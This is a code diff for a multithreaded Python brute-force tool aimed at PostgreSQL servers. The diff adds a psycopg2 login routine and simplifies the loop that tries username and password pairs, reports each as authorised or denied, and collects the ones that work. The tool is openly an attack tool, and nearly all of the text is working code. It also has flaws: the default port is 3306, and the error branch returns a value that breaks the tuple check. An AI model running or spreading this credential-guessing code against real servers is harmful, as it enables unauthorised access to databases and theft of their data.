@@ -1,5 +1,6 @@
 #! /usr/bin/env python3
 
+import psycopg2
 from datetime import date
 from optparse import OptionParser
 from colorama import Fore, Back, Style
@@ -27,24 +28,33 @@ port = 3306
 lock = Lock()
 
 def login(postgresql_server, port, user, password):
-    pass
+    t1 = time()
+    try:
+        connection = psycopg2.connect(host=postgresql_server, port=port, user=user, password=password)
+        connection.close()
+        t2 = time()
+        return True, t2-t1
+    except psycopg2.OperationalError:
+        t2 = time()
+        return False, t2-t1
+    except Exception as err:
+        t2 = time()
+        return err
 
 def brute_force(thread_index, postgresql_server, port, credentials):
     successful_logins = {}
     for credential in credentials:
-        status = ['']
-        while status[0] != True and status[0] != False:
-            status = login(postgresql_server, port, credential[0], credential[1])
-            if status[0] == True:
-                successful_logins[credential[0]] = credential[1]
-                with lock:
-                    display(' ', f"Thread {thread_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET} => {Back.MAGENTA}{Fore.BLUE}Authorized{Fore.RESET}{Back.RESET}")
-            elif status[0] == False:
-                with lock:
-                    display(' ', f"Thread {thread_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET} => {Back.RED}{Fore.YELLOW}Access Denied{Fore.RESET}{Back.RESET}")
-            else:
-                with lock:
-                    display(' ', f"Thread {thread_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET} => {Fore.YELLOW}Error Occured : {Back.RED}{status[0]}{Fore.RESET}{Back.RESET}")
+        status = login(postgresql_server, port, credential[0], credential[1])
+        if status[0] == True:
+            successful_logins[credential[0]] = credential[1]
+            with lock:
+                display(' ', f"Thread {thread_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET} => {Back.MAGENTA}{Fore.BLUE}Authorized{Fore.RESET}{Back.RESET}")
+        elif status[0] == False:
+            with lock:
+                display(' ', f"Thread {thread_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET} => {Back.RED}{Fore.YELLOW}Access Denied{Fore.RESET}{Back.RESET}")
+        else:
+            with lock:
+                display(' ', f"Thread {thread_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET} => {Fore.YELLOW}Error Occured : {Back.RED}{status[0]}{Fore.RESET}{Back.RESET}")
     return successful_logins
 def main(server, port, credentials):
     successful_logins = {}
